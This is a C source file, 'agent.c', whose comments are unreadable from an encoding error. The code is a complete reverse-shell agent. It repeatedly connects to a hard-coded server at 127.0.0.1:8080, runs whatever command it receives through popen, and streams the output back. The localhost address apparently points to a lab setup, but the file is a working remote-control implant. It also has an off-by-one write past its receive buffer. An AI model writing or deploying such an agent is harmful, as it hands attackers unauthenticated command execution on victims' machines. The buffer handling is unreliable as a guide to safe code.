// agent.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define PORT 8080
#define BUFFER_SIZE 1024

void execute_command(int socket_fd) {
    char command[BUFFER_SIZE];
    char result[BUFFER_SIZE];

    // �T�[�o�[����̃R�}���h����M
    int recv_len = recv(socket_fd, command, BUFFER_SIZE, 0);
    if (recv_len <= 0) {
        return;
    }
    command[recv_len] = '\0';  // ��M�����f�[�^�𕶎���Ƃ��Ĉ���
    printf("Command received: %s\n", command);

    // �R�}���h�����s���Č��ʂ��擾
    FILE* fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen failed");
        return;
    }

    // ���ʂ��T�[�o�[�ɑ��M
    while (fgets(result, sizeof(result), fp) != NULL) {
        send(socket_fd, result, strlen(result), 0);
    }
    pclose(fp);

    // �I�����b�Z�[�W���T�[�o�[�ɑ��M
    strcpy(result, "END_OF_RESULT");
    send(socket_fd, result, strlen(result), 0);
}

int main() {
    int socket_fd;
    struct sockaddr_in server_addr;

    while (1) {
        // �\�P�b�g�̍쐬
        socket_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_fd < 0) {
            perror("Socket creation failed");
            sleep(1);  // �Đڑ��̑O�ɏ����ҋ@
            continue;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

        // �T�[�o�[�ւ̐ڑ�
        if (connect(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(socket_fd);
            sleep(1);  // �Đڑ��̑O�ɏ����ҋ@
            continue;
        }

        printf("Connected to server\n");

        // �R�}���h�̑ҋ@�Ǝ��s
        execute_command(socket_fd);

        printf("Command execution finished\n");
        close(socket_fd);
    }

    return 0;
}
